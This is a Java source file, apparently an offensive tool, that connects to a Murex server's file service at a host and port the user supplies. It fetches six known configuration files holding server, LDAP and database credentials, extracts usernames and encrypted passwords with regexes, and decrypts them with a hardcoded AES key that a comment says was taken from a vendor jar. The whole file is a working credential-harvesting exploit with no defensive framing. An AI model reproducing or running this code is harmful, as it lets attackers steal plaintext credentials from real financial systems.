package com.murexologist;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Stream;

import static java.nio.ByteBuffer.allocate;
import static java.util.Arrays.stream;
import static java.util.regex.Pattern.compile;
import static java.util.stream.Collectors.toList;

public class GetPasswordzJava {
	public static void main(String[] args) {
		final String[] myArgs;
		if(args == null || args.length!= 2){
			myArgs = new String[2];
			final Scanner scanner = new Scanner(System.in);
			System.out.print("FS Host: ");
			myArgs[0] = scanner.next();
			System.out.print("FS Port: ");
			myArgs[1] = scanner.next();
		}else{
			myArgs = args;
		}
		int pt=Integer.parseInt(myArgs[1]);
		stream(new String[][]{
			new String[]{dbConf+"mxservercredential.mxres","(?:USER:|user=\")(\\w*)","(?:PASSWORD:|password=\")(\\p{Alnum}*)"},
			new String[]{"/public/mxres/ldap/LdapConfigurationFile.xml","<userDn>([^<]*)","<encryptedPassword>(\\p{Alnum}*)"},
			new String[]{dbConf+"dbsource.mxres","<DbUser>(\\w*)","<DbPassword>(\\p{Alnum}*)"},
			new String[]{dbConf+"dbsourcerep.mxres","<DbUser>(\\w*)","<DbPassword>(\\p{Alnum}*)"},
			new String[]{"/public/mxres/mxmlc/dbconfig/dbsource_mlc.mxres","<DbUser>(\\w*)","<DbPassword>(\\p{Alnum}*)"},
			new String[]{dbConf+"credentials.properties","PASSWORD\\.(\\w*)","PASSWORD\\.\\w*=(\\p{Alnum}*)"}})
			  .flatMap(i->{
				  try {
					  URLConnection uc = (new URL("http",myArgs[0],pt,i[0])).openConnection();
					  uc.setRequestProperty("MUREX-EXTENSION","murex");
					  if(!"OK".equals(uc.getHeaderField("Murex-Answer"))) {
						  dealWithIt(uc);
					  }
					  try(BufferedReader r=new BufferedReader(new InputStreamReader(uc.getInputStream()))){
						  final List<String> lines=r.lines().collect(toList());
						  List<String>u=lines.stream().map(compile(i[1])::matcher).filter(Matcher::find).map(m->m.group(1)).collect(toList());
						  List<String>p=lines.stream().map(compile(i[2])::matcher).filter(Matcher::find).map(m->m.group(1)).collect(toList());
						  return IntStream
							  .range(0,p.size()).mapToObj(j->  decode(i[0], p.get(j), u.get(j)));
					  }catch(Exception e){
						  return Stream.empty();
					  }
				  }catch(IOException e){return Stream.of(e.getMessage());}
			  }).sequential().distinct().sorted().forEach(System.out::println);
	}

	private static void dealWithIt(URLConnection uc) {
		String content="";
		try{
			content = uc.getContent().toString();
		}catch (IOException ee){
			content = ee.getMessage();
		}

		final var headers = uc
								.getHeaderFields()
								.entrySet()
								.stream()
								.map(e -> e.getKey() + "=" + e.getValue() + " ")
								.collect(Collectors.joining(", "));
		throw new RuntimeException("Nope. "
									   + headers
									   + " "
									   + content);
	}

	private static String decode(String fileName, String password, String userName) {
		ByteBuffer bb= allocate(password.length()/4);
		try{Cipher c= Cipher.getInstance("AES/CBC/PKCS5Padding");
			stream(password.split("(?<=\\G.{4})")).forEach(s->bb.put((byte)(Integer.parseInt(s,16))));
			c.init(2,sks,new IvParameterSpec(bb.array(),0,16));
			return fileName + "\t" + userName + "\t" + new String(c.doFinal(bb.array(), 16, bb.capacity() - 16));
		}catch(Exception e){
			return userName + "\t" + "Nope. " + e.getMessage();
		}
	}

	//Key is from common-utils-2.2.2.jar\murex\settings\mx.txt : SecretKeySerializerFactory.getKeySerializer().deserialize(getClass().getClassLoader().getResourceAsStream("murex/settings/mx.txt")).getHexaKey();
	//Key as HexString: 18:8E:31:96:B0:CE:D6:5C:79:63:94:84:6F:C7:94:38
	static SecretKeySpec sks=new SecretKeySpec(new byte[]{24,-114,49,-106,-80,-50,-42,92,121,99,-108,-124,111,-57,-108,56},"AES");
	static String dbConf="/public/mxres/common/dbconfig/";
}
